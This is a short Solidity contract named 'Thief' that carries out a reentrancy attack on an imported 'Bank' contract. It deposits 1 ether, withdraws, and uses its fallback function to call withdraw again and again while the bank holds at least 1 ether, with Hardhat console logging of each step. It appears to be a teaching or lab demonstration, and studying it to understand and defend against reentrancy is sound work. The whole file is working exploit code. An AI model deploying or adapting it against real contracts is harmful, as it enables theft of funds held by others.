pragma solidity >=0.7.0 <0.9.0;
import "./bank.sol";
import "hardhat/console.sol";

contract Thief {

    Bank public bank;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
    }

    fallback() external payable {
        console.log("step thief 1");
        if (address(bank).balance >= 1 ether) {
            console.log("step thief 2");
            bank.withdraw();
            console.log("step thief 3");
        }
        console.log("step thief 4");
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw(); 

    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}